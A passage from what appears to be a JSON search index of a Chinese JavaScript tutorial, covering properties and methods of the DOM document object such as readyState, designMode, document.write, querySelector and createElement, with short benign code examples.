\u5f15\u5165\u7684\uff0c\u4e00\u822c\u90fd\u662f\u914d\u5408\u8fd9\u4e2a API \u4f7f\u7528\u3002 \uff082\uff09document.visibilityState document.visibilityState \u8fd4\u56de\u6587\u6863\u7684\u53ef\u89c1\u72b6\u6001\u3002 \u5b83\u7684\u503c\u6709\u56db\u79cd\u53ef\u80fd\u3002 visible \uff1a\u9875\u9762\u53ef\u89c1\u3002\u6ce8\u610f\uff0c\u9875\u9762\u53ef\u80fd\u662f\u90e8\u5206\u53ef\u89c1\uff0c\u5373\u4e0d\u662f\u7126\u70b9\u7a97\u53e3\uff0c\u524d\u9762\u88ab\u5176\u4ed6\u7a97\u53e3\u90e8\u5206\u6321\u4f4f\u4e86\u3002 hidden \uff1a\u9875\u9762\u4e0d\u53ef\u89c1\uff0c\u6709\u53ef\u80fd\u7a97\u53e3\u6700\u5c0f\u5316\uff0c\u6216\u8005\u6d4f\u89c8\u5668\u5207\u6362\u5230\u4e86\u53e6\u4e00\u4e2a Tab\u3002 prerender \uff1a\u9875\u9762\u5904\u4e8e\u6b63\u5728\u6e32\u67d3\u72b6\u6001\uff0c\u5bf9\u4e8e\u7528\u6237\u6765\u8bf4\uff0c\u8be5\u9875\u9762\u4e0d\u53ef\u89c1\u3002 unloaded \uff1a\u9875\u9762\u4ece\u5185\u5b58\u91cc\u9762\u5378\u8f7d\u4e86\u3002 \u8fd9\u4e2a\u5c5e\u6027\u53ef\u4ee5\u7528\u5728\u9875\u9762\u52a0\u8f7d\u65f6\uff0c\u9632\u6b62\u52a0\u8f7d\u67d0\u4e9b\u8d44\u6e90\uff1b\u6216\u8005\u9875\u9762\u4e0d\u53ef\u89c1\u65f6\uff0c\u505c\u6389\u4e00\u4e9b\u9875\u9762\u529f\u80fd\u3002 \uff083\uff09document.readyState document.readyState \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u6587\u6863\u7684\u72b6\u6001\uff0c\u5171\u6709\u4e09\u79cd\u53ef\u80fd\u7684\u503c\u3002 loading \uff1a\u52a0\u8f7d HTML \u4ee3\u7801\u9636\u6bb5\uff08\u5c1a\u672a\u5b8c\u6210\u89e3\u6790\uff09 interactive \uff1a\u52a0\u8f7d\u5916\u90e8\u8d44\u6e90\u9636\u6bb5 complete \uff1a\u52a0\u8f7d\u5b8c\u6210 \u8fd9\u4e2a\u5c5e\u6027\u53d8\u5316\u7684\u8fc7\u7a0b\u5982\u4e0b\u3002 \u6d4f\u89c8\u5668\u5f00\u59cb\u89e3\u6790 HTML \u6587\u6863\uff0c document.readyState \u5c5e\u6027\u7b49\u4e8e loading \u3002 \u6d4f\u89c8\u5668\u9047\u5230 HTML \u6587\u6863\u4e2d\u7684 <script> \u5143\u7d20\uff0c\u5e76\u4e14\u6ca1\u6709 async \u6216 defer \u5c5e\u6027\uff0c\u5c31\u6682\u505c\u89e3\u6790\uff0c\u5f00\u59cb\u6267\u884c\u811a\u672c\uff0c\u8fd9\u65f6 document.readyState \u5c5e\u6027\u8fd8\u662f\u7b49\u4e8e loading \u3002 HTML \u6587\u6863\u89e3\u6790\u5b8c\u6210\uff0c document.readyState \u5c5e\u6027\u53d8\u6210 interactive \u3002 \u6d4f\u89c8\u5668\u7b49\u5f85\u56fe\u7247\u3001\u6837\u5f0f\u8868\u3001\u5b57\u4f53\u6587\u4ef6\u7b49\u5916\u90e8\u8d44\u6e90\u52a0\u8f7d\u5b8c\u6210\uff0c\u4e00\u65e6\u5168\u90e8\u52a0\u8f7d\u5b8c\u6210\uff0c document.readyState \u5c5e\u6027\u53d8\u6210 complete \u3002 \u4e0b\u9762\u7684\u4ee3\u7801\u7528\u6765\u68c0\u67e5\u7f51\u9875\u662f\u5426\u52a0\u8f7d\u6210\u529f\u3002 1 2 3 4 5 6 7 8 9 10 11 12 // \u57fa\u672c\u68c0\u67e5 if ( document . readyState === 'complete' ) { // ... } // \u8f6e\u8be2\u68c0\u67e5 var interval = setInterval ( function () { if ( document . readyState === 'complete' ) { clearInterval ( interval ); // ... } }, 100 ); \u53e6\u5916\uff0c\u6bcf\u6b21\u72b6\u6001\u53d8\u5316\u90fd\u4f1a\u89e6\u53d1\u4e00\u4e2a readystatechange \u4e8b\u4ef6\u3002","title":"\u6587\u6863\u72b6\u6001\u5c5e\u6027"},{"location":"dom/document/#documentcookie","text":"document.cookie \u5c5e\u6027\u7528\u6765\u64cd\u4f5c\u6d4f\u89c8\u5668 Cookie\uff0c\u8be6\u89c1\u300a\u6d4f\u89c8\u5668\u6a21\u578b\u300b\u90e8\u5206\u7684\u300aCookie\u300b\u7ae0\u8282\u3002","title":"document.cookie"},{"location":"dom/document/#documentdesignmode","text":"document.designMode \u5c5e\u6027\u63a7\u5236\u5f53\u524d\u6587\u6863\u662f\u5426\u53ef\u7f16\u8f91\u3002\u8be5\u5c5e\u6027\u53ea\u6709\u4e24\u4e2a\u503c on \u548c off \uff0c\u9ed8\u8ba4\u503c\u4e3a off \u3002\u4e00\u65e6\u8bbe\u4e3a on \uff0c\u7528\u6237\u5c31\u53ef\u4ee5\u7f16\u8f91\u6574\u4e2a\u6587\u6863\u7684\u5185\u5bb9\u3002 \u4e0b\u9762\u4ee3\u7801\u6253\u5f00 iframe \u5143\u7d20\u5185\u90e8\u6587\u6863\u7684 designMode \u5c5e\u6027\uff0c\u5c31\u80fd\u5c06\u5176\u53d8\u4e3a\u4e00\u4e2a\u6240\u89c1\u5373\u6240\u5f97\u7684\u7f16\u8f91\u5668\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <iframe id=\"editor\" src=\"about:blank\"></iframe> var editor = document . getElementById ( 'editor' ); editor . contentDocument . designMode = 'on' ;","title":"document.designMode"},{"location":"dom/document/#documentcurrentscript","text":"document.currentScript \u5c5e\u6027\u53ea\u7528\u5728 <script> \u5143\u7d20\u7684\u5185\u5d4c\u811a\u672c\u6216\u52a0\u8f7d\u7684\u5916\u90e8\u811a\u672c\u4e4b\u4e2d\uff0c\u8fd4\u56de\u5f53\u524d\u811a\u672c\u6240\u5728\u7684\u90a3\u4e2a DOM \u8282\u70b9\uff0c\u5373 <script> \u5143\u7d20\u7684 DOM \u8282\u70b9\u3002 1 2 3 4 5 < script id = \"foo\" > console . log ( document . currentScript === document . getElementById ( 'foo' ) ); // true </ script > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c document.currentScript \u5c31\u662f <script> \u5143\u7d20\u8282\u70b9\u3002","title":"document.currentScript"},{"location":"dom/document/#documentimplementation","text":"document.implementation \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a DOMImplementation \u5bf9\u8c61\u3002\u8be5\u5bf9\u8c61\u6709\u4e09\u4e2a\u65b9\u6cd5\uff0c\u4e3b\u8981\u7528\u4e8e\u521b\u5efa\u72ec\u7acb\u4e8e\u5f53\u524d\u6587\u6863\u7684\u65b0\u7684 Document \u5bf9\u8c61\u3002 DOMImplementation.createDocument() \uff1a\u521b\u5efa\u4e00\u4e2a XML \u6587\u6863\u3002 DOMImplementation.createHTMLDocument() \uff1a\u521b\u5efa\u4e00\u4e2a HTML \u6587\u6863\u3002 DOMImplementation.createDocumentType() \uff1a\u521b\u5efa\u4e00\u4e2a DocumentType \u5bf9\u8c61\u3002 \u4e0b\u9762\u662f\u521b\u5efa HTML \u6587\u6863\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 var doc = document . implementation . createHTMLDocument ( 'Title' ); var p = doc . createElement ( 'p' ); p . innerHTML = 'hello world' ; doc . body . appendChild ( p ); document . replaceChild ( doc . documentElement , document . documentElement ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u6b65\u751f\u6210\u4e00\u4e2a\u65b0\u7684 HTML \u6587\u6863 doc \uff0c\u7136\u540e\u7528\u5b83\u7684\u6839\u5143\u7d20 document.documentElement \u66ff\u6362\u6389 document.documentElement \u3002\u8fd9\u4f1a\u4f7f\u5f97\u5f53\u524d\u6587\u6863\u7684\u5185\u5bb9\u5168\u90e8\u6d88\u5931\uff0c\u53d8\u6210 hello world \u3002","title":"document.implementation"},{"location":"dom/document/#_7","text":"","title":"\u65b9\u6cd5"},{"location":"dom/document/#documentopendocumentclose","text":"document.open \u65b9\u6cd5\u6e05\u9664\u5f53\u524d\u6587\u6863\u6240\u6709\u5185\u5bb9\uff0c\u4f7f\u5f97\u6587\u6863\u5904\u4e8e\u53ef\u5199\u72b6\u6001\uff0c\u4f9b document.write \u65b9\u6cd5\u5199\u5165\u5185\u5bb9\u3002 document.close \u65b9\u6cd5\u7528\u6765\u5173\u95ed document.open() \u6253\u5f00\u7684\u6587\u6863\u3002 1 2 3 document . open (); document . write ( 'hello world' ); document . close ();","title":"document.open()\uff0cdocument.close()"},{"location":"dom/document/#documentwritedocumentwriteln","text":"document.write \u65b9\u6cd5\u7528\u4e8e\u5411\u5f53\u524d\u6587\u6863\u5199\u5165\u5185\u5bb9\u3002 \u5728\u7f51\u9875\u7684\u9996\u6b21\u6e32\u67d3\u9636\u6bb5\uff0c\u53ea\u8981\u9875\u9762\u6ca1\u6709\u5173\u95ed\u5199\u5165\uff08\u5373\u6ca1\u6709\u6267\u884c document.close() \uff09\uff0c document.write \u5199\u5165\u7684\u5185\u5bb9\u5c31\u4f1a\u8ffd\u52a0\u5728\u5df2\u6709\u5185\u5bb9\u7684\u540e\u9762\u3002 1 2 3 4 5 // \u9875\u9762\u663e\u793a\u201chelloworld\u201d document . open (); document . write ( 'hello' ); document . write ( 'world' ); document . close (); \u6ce8\u610f\uff0c document.write \u4f1a\u5f53\u4f5c HTML \u4ee3\u7801\u89e3\u6790\uff0c\u4e0d\u4f1a\u8f6c\u4e49\u3002 1 document . write ( '<p>hello world</p>' ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c document.write \u4f1a\u5c06 <p> \u5f53\u4f5c HTML \u6807\u7b7e\u89e3\u91ca\u3002 \u5982\u679c\u9875\u9762\u5df2\u7ecf\u89e3\u6790\u5b8c\u6210\uff08 DOMContentLoaded \u4e8b\u4ef6\u53d1\u751f\u4e4b\u540e\uff09\uff0c\u518d\u8c03\u7528 write \u65b9\u6cd5\uff0c\u5b83\u4f1a\u5148\u8c03\u7528 open \u65b9\u6cd5\uff0c\u64e6\u9664\u5f53\u524d\u6587\u6863\u6240\u6709\u5185\u5bb9\uff0c\u7136\u540e\u518d\u5199\u5165\u3002 1 2 3 4 5 6 7 8 9 10 document . addEventListener ( 'DOMContentLoaded' , function ( event ) { document . write ( '<p>Hello World!</p>' ); }); // \u7b49\u540c\u4e8e document . addEventListener ( 'DOMContentLoaded' , function ( event ) { document . open (); document . write ( '<p>Hello World!</p>' ); document . close (); }); \u5982\u679c\u5728\u9875\u9762\u6e32\u67d3\u8fc7\u7a0b\u4e2d\u8c03\u7528 write \u65b9\u6cd5\uff0c\u5e76\u4e0d\u4f1a\u81ea\u52a8\u8c03\u7528 open \u65b9\u6cd5\u3002\uff08\u53ef\u4ee5\u7406\u89e3\u6210\uff0c open \u65b9\u6cd5\u5df2\u8c03\u7528\uff0c\u4f46 close \u65b9\u6cd5\u8fd8\u672a\u8c03\u7528\u3002\uff09 1 2 3 4 5 6 7 8 < html > < body > hello < script type = \"text/javascript\" > document . write ( \"world\" ) </ script > </ body > </ html > \u5728\u6d4f\u89c8\u5668\u6253\u5f00\u4e0a\u9762\u7f51\u9875\uff0c\u5c06\u4f1a\u663e\u793a hello world \u3002 document.write \u662f JavaScript \u8bed\u8a00\u6807\u51c6\u5316\u4e4b\u524d\u5c31\u5b58\u5728\u7684\u65b9\u6cd5\uff0c\u73b0\u5728\u5b8c\u5168\u6709\u66f4\u7b26\u5408\u6807\u51c6\u7684\u65b9\u6cd5\u5411\u6587\u6863\u5199\u5165\u5185\u5bb9\uff08\u6bd4\u5982\u5bf9 innerHTML \u5c5e\u6027\u8d4b\u503c\uff09\u3002\u6240\u4ee5\uff0c\u9664\u4e86\u67d0\u4e9b\u7279\u6b8a\u60c5\u51b5\uff0c\u5e94\u8be5\u5c3d\u91cf\u907f\u514d\u4f7f\u7528 document.write \u8fd9\u4e2a\u65b9\u6cd5\u3002 document.writeln \u65b9\u6cd5\u4e0e write \u65b9\u6cd5\u5b8c\u5168\u4e00\u81f4\uff0c\u9664\u4e86\u4f1a\u5728\u8f93\u51fa\u5185\u5bb9\u7684\u5c3e\u90e8\u6dfb\u52a0\u6362\u884c\u7b26\u3002 1 2 3 4 5 6 7 8 9 document . write ( 1 ); document . write ( 2 ); // 12 document . writeln ( 1 ); document . writeln ( 2 ); // 1 // 2 // \u6ce8\u610f\uff0c writeln \u65b9\u6cd5\u6dfb\u52a0\u7684\u662f ASCII \u7801\u7684\u6362\u884c\u7b26\uff0c\u6e32\u67d3\u6210 HTML \u7f51\u9875\u65f6\u4e0d\u8d77\u4f5c\u7528\uff0c\u5373\u5728\u7f51\u9875\u4e0a\u663e\u793a\u4e0d\u51fa\u6362\u884c\u3002\u7f51\u9875\u4e0a\u7684\u6362\u884c\uff0c\u5fc5\u987b\u663e\u5f0f\u5199\u5165 <br> \u3002","title":"document.write()\uff0cdocument.writeln()"},{"location":"dom/document/#documentqueryselectordocumentqueryselectorall","text":"document.querySelector \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a CSS \u9009\u62e9\u5668\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u5339\u914d\u8be5\u9009\u62e9\u5668\u7684\u5143\u7d20\u8282\u70b9\u3002\u5982\u679c\u6709\u591a\u4e2a\u8282\u70b9\u6ee1\u8db3\u5339\u914d\u6761\u4ef6\uff0c\u5219\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5339\u914d\u7684\u8282\u70b9\u3002\u5982\u679c\u6ca1\u6709\u53d1\u73b0\u5339\u914d\u7684\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 2 var el1 = document . querySelector ( '.myclass' ); var el2 = document . querySelector ( '#myParent > [ng-click]' ); document.querySelectorAll \u65b9\u6cd5\u4e0e querySelector \u7528\u6cd5\u7c7b\u4f3c\uff0c\u533a\u522b\u662f\u8fd4\u56de\u4e00\u4e2a NodeList \u5bf9\u8c61\uff0c\u5305\u542b\u6240\u6709\u5339\u914d\u7ed9\u5b9a\u9009\u62e9\u5668\u7684\u8282\u70b9\u3002 1 elementList = document . querySelectorAll ( '.myclass' ); \u8fd9\u4e24\u4e2a\u65b9\u6cd5\u7684\u53c2\u6570\uff0c\u53ef\u4ee5\u662f\u9017\u53f7\u5206\u9694\u7684\u591a\u4e2a CSS \u9009\u62e9\u5668\uff0c\u8fd4\u56de\u5339\u914d\u5176\u4e2d\u4e00\u4e2a\u9009\u62e9\u5668\u7684\u5143\u7d20\u8282\u70b9\uff0c\u8fd9\u4e0e CSS \u9009\u62e9\u5668\u7684\u89c4\u5219\u662f\u4e00\u81f4\u7684\u3002 1 var matches = document . querySelectorAll ( 'div.note, div.alert' ); \u4e0a\u9762\u4ee3\u7801\u8fd4\u56de class \u5c5e\u6027\u662f note \u6216 alert \u7684 div \u5143\u7d20\u3002 \u8fd9\u4e24\u4e2a\u65b9\u6cd5\u90fd\u652f\u6301\u590d\u6742\u7684 CSS \u9009\u62e9\u5668\u3002 1 2 3 4 5 6 7 8 9 10 11 // \u9009\u4e2d data-foo-bar \u5c5e\u6027\u7b49\u4e8e someval \u7684\u5143\u7d20 document . querySelectorAll ( '[data-foo-bar=\"someval\"]' ); // \u9009\u4e2d myForm \u8868\u5355\u4e2d\u6240\u6709\u4e0d\u901a\u8fc7\u9a8c\u8bc1\u7684\u5143\u7d20 document . querySelectorAll ( '#myForm :invalid' ); // \u9009\u4e2ddiv\u5143\u7d20\uff0c\u90a3\u4e9b class \u542b ignore \u7684\u9664\u5916 document . querySelectorAll ( 'DIV:not(.ignore)' ); // \u540c\u65f6\u9009\u4e2d div\uff0ca\uff0cscript \u4e09\u7c7b\u5143\u7d20 document . querySelectorAll ( 'DIV, A, SCRIPT' ); \u4f46\u662f\uff0c\u5b83\u4eec\u4e0d\u652f\u6301 CSS \u4f2a\u5143\u7d20\u7684\u9009\u62e9\u5668\uff08\u6bd4\u5982 :first-line \u548c :first-letter \uff09\u548c\u4f2a\u7c7b\u7684\u9009\u62e9\u5668\uff08\u6bd4\u5982 :link \u548c :visited \uff09\uff0c\u5373\u65e0\u6cd5\u9009\u4e2d\u4f2a\u5143\u7d20\u548c\u4f2a\u7c7b\u3002 \u5982\u679c querySelectorAll \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u5b57\u7b26\u4e32 * \uff0c\u5219\u4f1a\u8fd4\u56de\u6587\u6863\u4e2d\u7684\u6240\u6709\u5143\u7d20\u8282\u70b9\u3002\u53e6\u5916\uff0c querySelectorAll \u7684\u8fd4\u56de\u7ed3\u679c\u4e0d\u662f\u52a8\u6001\u96c6\u5408\uff0c\u4e0d\u4f1a\u5b9e\u65f6\u53cd\u6620\u5143\u7d20\u8282\u70b9\u7684\u53d8\u5316\u3002 \u6700\u540e\uff0c\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u9664\u4e86\u5b9a\u4e49\u5728 document \u5bf9\u8c61\u4e0a\uff0c\u8fd8\u5b9a\u4e49\u5728\u5143\u7d20\u8282\u70b9\u4e0a\uff0c\u5373\u5728\u5143\u7d20\u8282\u70b9\u4e0a\u4e5f\u53ef\u4ee5\u8c03\u7528\u3002","title":"document.querySelector()\uff0cdocument.querySelectorAll()"},{"location":"dom/document/#documentgetelementsbytagname","text":"document.getElementsByTagName() \u65b9\u6cd5\u641c\u7d22 HTML \u6807\u7b7e\u540d\uff0c\u8fd4\u56de\u7b26\u5408\u6761\u4ef6\u7684\u5143\u7d20\u3002\u5b83\u7684\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u5bf9\u8c61\uff08 HTMLCollection \u5b9e\u4f8b\uff09\uff0c\u53ef\u4ee5\u5b9e\u65f6\u53cd\u6620 HTML \u6587\u6863\u7684\u53d8\u5316\u3002\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u5339\u914d\u7684\u5143\u7d20\uff0c\u5c31\u8fd4\u56de\u4e00\u4e2a\u7a7a\u96c6\u3002 1 2 var paras = document . getElementsByTagName ( 'p' ); paras instanceof HTMLCollection // true \u4e0a\u9762\u4ee3\u7801\u8fd4\u56de\u5f53\u524d\u6587\u6863\u7684\u6240\u6709 p \u5143\u7d20\u8282\u70b9\u3002 HTML \u6807\u7b7e\u540d\u662f\u5927\u5c0f\u5199\u4e0d\u654f\u611f\u7684\uff0c\u56e0\u6b64 getElementsByTagName() \u65b9\u6cd5\u7684\u53c2\u6570\u4e5f\u662f\u5927\u5c0f\u5199\u4e0d\u654f\u611f\u7684\u3002\u53e6\u5916\uff0c\u8fd4\u56de\u7ed3\u679c\u4e2d\uff0c\u5404\u4e2a\u6210\u5458\u7684\u987a\u5e8f\u5c31\u662f\u5b83\u4eec\u5728\u6587\u6863\u4e2d\u51fa\u73b0\u7684\u987a\u5e8f\u3002 \u5982\u679c\u4f20\u5165 * \uff0c\u5c31\u53ef\u4ee5\u8fd4\u56de\u6587\u6863\u4e2d\u6240\u6709 HTML \u5143\u7d20\u3002 1 var allElements = document . getElementsByTagName ( '*' ); \u6ce8\u610f\uff0c\u5143\u7d20\u8282\u70b9\u672c\u8eab\u4e5f\u5b9a\u4e49\u4e86 getElementsByTagName \u65b9\u6cd5\uff0c\u8fd4\u56de\u8be5\u5143\u7d20\u7684\u540e\u4ee3\u5143\u7d20\u4e2d\u7b26\u5408\u6761\u4ef6\u7684\u5143\u7d20\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4e0d\u4ec5\u53ef\u4ee5\u5728 document \u5bf9\u8c61\u4e0a\u8c03\u7528\uff0c\u4e5f\u53ef\u4ee5\u5728\u4efb\u4f55\u5143\u7d20\u8282\u70b9\u4e0a\u8c03\u7528\u3002 1 2 var firstPara = document . getElementsByTagName ( 'p' )[ 0 ]; var spans = firstPara . getElementsByTagName ( 'span' ); \u4e0a\u9762\u4ee3\u7801\u9009\u4e2d\u7b2c\u4e00\u4e2a p \u5143\u7d20\u5185\u90e8\u7684\u6240\u6709 span \u5143\u7d20\u3002","title":"document.getElementsByTagName()"},{"location":"dom/document/#documentgetelementsbyclassname","text":"document.getElementsByClassName() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff08 HTMLCollection \u5b9e\u4f8b\uff09\uff0c\u5305\u62ec\u4e86\u6240\u6709 class \u540d\u5b57\u7b26\u5408\u6307\u5b9a\u6761\u4ef6\u7684\u5143\u7d20\uff0c\u5143\u7d20\u7684\u53d8\u5316\u5b9e\u65f6\u53cd\u6620\u5728\u8fd4\u56de\u7ed3\u679c\u4e2d\u3002 1 var elements = document . getElementsByClassName ( names ); \u7531\u4e8e class \u662f\u4fdd\u7559\u5b57\uff0c\u6240\u4ee5 JavaScript \u4e00\u5f8b\u4f7f\u7528 className \u8868\u793a CSS \u7684 class \u3002 \u53c2\u6570\u53ef\u4ee5\u662f\u591a\u4e2a class \uff0c\u5b83\u4eec\u4e4b\u95f4\u4f7f\u7528\u7a7a\u683c\u5206\u9694\u3002 1 var elements = document . getElementsByClassName ( 'foo bar' ); \u4e0a\u9762\u4ee3\u7801\u8fd4\u56de\u540c\u65f6\u5177\u6709 foo \u548c bar \u4e24\u4e2a class \u7684\u5143\u7d20\uff0c foo \u548c bar \u7684\u987a\u5e8f\u4e0d\u91cd\u8981\u3002 \u6ce8\u610f\uff0c\u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0cCSS \u7684 class \u662f\u5927\u5c0f\u5199\u654f\u611f\u7684\u3002\uff08 quirks mode \u4e0b\uff0c\u5927\u5c0f\u5199\u4e0d\u654f\u611f\u3002\uff09 \u4e0e getElementsByTagName() \u65b9\u6cd5\u4e00\u6837\uff0c getElementsByClassName() \u65b9\u6cd5\u4e0d\u4ec5\u53ef\u4ee5\u5728 document \u5bf9\u8c61\u4e0a\u8c03\u7528\uff0c\u4e5f\u53ef\u4ee5\u5728\u4efb\u4f55\u5143\u7d20\u8282\u70b9\u4e0a\u8c03\u7528\u3002 1 2 // \u975edocument\u5bf9\u8c61\u4e0a\u8c03\u7528 var elements = rootElement . getElementsByClassName ( names );","title":"document.getElementsByClassName()"},{"location":"dom/document/#documentgetelementsbyname","text":"document.getElementsByName() \u65b9\u6cd5\u7528\u4e8e\u9009\u62e9\u62e5\u6709 name \u5c5e\u6027\u7684 HTML \u5143\u7d20\uff08\u6bd4\u5982 <form> \u3001 <radio> \u3001 <img> \u3001 <frame> \u3001 <embed> \u548c <object> \u7b49\uff09\uff0c\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u7684\u5bf9\u8c61\uff08 NodeList \u5b9e\u4f8b\uff09\uff0c\u56e0\u4e3a name \u5c5e\u6027\u76f8\u540c\u7684\u5143\u7d20\u53ef\u80fd\u4e0d\u6b62\u4e00\u4e2a\u3002 1 2 3 // \u8868\u5355\u4e3a <form name=\"x\"></form> var forms = document . getElementsByName ( 'x' ); forms [ 0 ]. tagName // \"FORM\"","title":"document.getElementsByName()"},{"location":"dom/document/#documentgetelementbyid","text":"document.getElementById() \u65b9\u6cd5\u8fd4\u56de\u5339\u914d\u6307\u5b9a id \u5c5e\u6027\u7684\u5143\u7d20\u8282\u70b9\u3002\u5982\u679c\u6ca1\u6709\u53d1\u73b0\u5339\u914d\u7684\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 var elem = document . getElementById ( 'para1' ); \u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u7684\u53c2\u6570\u662f\u5927\u5c0f\u5199\u654f\u611f\u7684\u3002\u6bd4\u5982\uff0c\u5982\u679c\u67d0\u4e2a\u8282\u70b9\u7684 id \u5c5e\u6027\u662f main \uff0c\u90a3\u4e48 document.getElementById('Main') \u5c06\u8fd4\u56de null \u3002 document.getElementById() \u65b9\u6cd5\u4e0e document.querySelector() \u65b9\u6cd5\u90fd\u80fd\u83b7\u53d6\u5143\u7d20\u8282\u70b9\uff0c\u4e0d\u540c\u4e4b\u5904\u662f document.querySelector() \u65b9\u6cd5\u7684\u53c2\u6570\u4f7f\u7528 CSS \u9009\u62e9\u5668\u8bed\u6cd5\uff0c document.getElementById() \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u5143\u7d20\u7684 id \u5c5e\u6027\u3002 1 2 document . getElementById ( 'myElement' ) document . querySelector ( '#myElement' ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e24\u4e2a\u65b9\u6cd5\u90fd\u80fd\u9009\u4e2d id \u4e3a myElement \u7684\u5143\u7d20\uff0c\u4f46\u662f document.getElementById() \u6bd4 document.querySelector() \u6548\u7387\u9ad8\u5f97\u591a\u3002 \u53e6\u5916\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u53ea\u80fd\u5728 document \u5bf9\u8c61\u4e0a\u4f7f\u7528\uff0c\u4e0d\u80fd\u5728\u5176\u4ed6\u5143\u7d20\u8282\u70b9\u4e0a\u4f7f\u7528\u3002","title":"document.getElementById()"},{"location":"dom/document/#documentelementfrompointdocumentelementsfrompoint","text":"document.elementFromPoint() \u65b9\u6cd5\u8fd4\u56de\u4f4d\u4e8e\u9875\u9762\u6307\u5b9a\u4f4d\u7f6e\u6700\u4e0a\u5c42\u7684\u5143\u7d20\u8282\u70b9\u3002 1 var element = document . elementFromPoint ( 50 , 50 ); \u4e0a\u9762\u4ee3\u7801\u9009\u4e2d\u5728 (50, 50) \u8fd9\u4e2a\u5750\u6807\u4f4d\u7f6e\u7684\u6700\u4e0a\u5c42\u7684\u90a3\u4e2a HTML \u5143\u7d20\u3002 elementFromPoint \u65b9\u6cd5\u7684\u4e24\u4e2a\u53c2\u6570\uff0c\u4f9d\u6b21\u662f\u76f8\u5bf9\u4e8e\u5f53\u524d\u89c6\u53e3\u5de6\u4e0a\u89d2\u7684\u6a2a\u5750\u6807\u548c\u7eb5\u5750\u6807\uff0c\u5355\u4f4d\u662f\u50cf\u7d20\u3002\u5982\u679c\u4f4d\u4e8e\u8be5\u4f4d\u7f6e\u7684 HTML \u5143\u7d20\u4e0d\u53ef\u8fd4\u56de\uff08\u6bd4\u5982\u6587\u672c\u6846\u7684\u6eda\u52a8\u6761\uff09\uff0c\u5219\u8fd4\u56de\u5b83\u7684\u7236\u5143\u7d20\uff08\u6bd4\u5982\u6587\u672c\u6846\uff09\u3002\u5982\u679c\u5750\u6807\u503c\u65e0\u610f\u4e49\uff08\u6bd4\u5982\u8d1f\u503c\u6216\u8d85\u8fc7\u89c6\u53e3\u5927\u5c0f\uff09\uff0c\u5219\u8fd4\u56de null \u3002 document.elementsFromPoint() \u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u4f4d\u4e8e\u6307\u5b9a\u5750\u6807\uff08\u76f8\u5bf9\u4e8e\u89c6\u53e3\uff09\u7684\u6240\u6709\u5143\u7d20\u3002 1 var elements = document . elementsFromPoint ( x , y );","title":"document.elementFromPoint()\uff0cdocument.elementsFromPoint()"},{"location":"dom/document/#documentcreateelement","text":"document.createElement \u65b9\u6cd5\u7528\u6765\u751f\u6210\u5143\u7d20\u8282\u70b9\uff0c\u5e76\u8fd4\u56de\u8be5\u8282\u70b9\u3002 1 var newDiv = document . createElement ( 'div' ); createElement \u65b9\u6cd5\u7684\u53c2\u6570\u4e3a\u5143\u7d20\u7684\u6807\u7b7e\u540d\uff0c\u5373\u5143\u7d20\u8282\u70b9\u7684 tagName \u5c5e\u6027\uff0c\u5bf9\u4e8e HTML \u7f51\u9875\u5927\u5c0f\u5199\u4e0d\u654f\u611f\uff0c\u5373\u53c2\u6570\u4e3a div \u6216 DIV \u8fd4\u56de\u7684\u662f\u540c\u4e00\u79cd\u8282\u70b9\u3002\u5982\u679c\u53c2\u6570\u91cc\u9762\u5305\u542b\u5c16\u62ec\u53f7\uff08\u5373 < \u548c > \uff09\u4f1a\u62a5\u9519\u3002 1 2 document . createElement ( '<div>' ); // DOMException: The tag name provided ('<div>') is not a valid name \u6ce8\u610f\uff0c document.createElement \u7684\u53c2\u6570\u53ef\u4ee5\u662f\u81ea\u5b9a\u4e49\u7684\u6807\u7b7e\u540d\u3002 1 document . createElement ( 'foo' );","title":"document.createElement()"},{"location":"dom/document/#documentcreatetextnode","text":"document.createTextNode \u65b9\u6cd5\u7528\u6765\u751f\u6210\u6587\u672c\u8282\u70b9\uff08 Text \u5b9e\u4f8b\uff09\uff0c\u5e76\u8fd4\u56de\u8be5\u8282\u70b9\u3002\u5b83\u7684\u53c2\u6570\u662f\u6587\u672c\u8282\u70b9\u7684\u5185\u5bb9\u3002 1 2 3 var newDiv = document . createElement ( 'div' ); var newContent = document . createTextNode ( 'Hello' ); newDiv . appendChild ( newContent ); \u4e0a\u9762\u4ee3\u7801\u65b0\u5efa\u4e00\u4e2a div \u8282\u70b9\u548c\u4e00\u4e2a\u6587\u672c\u8282\u70b9\uff0c\u7136\u540e\u5c06\u6587\u672c\u8282\u70b9\u63d2\u5165 div \u8282\u70b9\u3002 \u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u786e\u4fdd\u8fd4\u56de\u7684\u8282\u70b9\uff0c\u88ab\u6d4f\u89c8\u5668\u5f53\u4f5c\u6587\u672c\u6e32\u67d3\uff0c\u800c\u4e0d\u662f\u5f53\u4f5c HTML 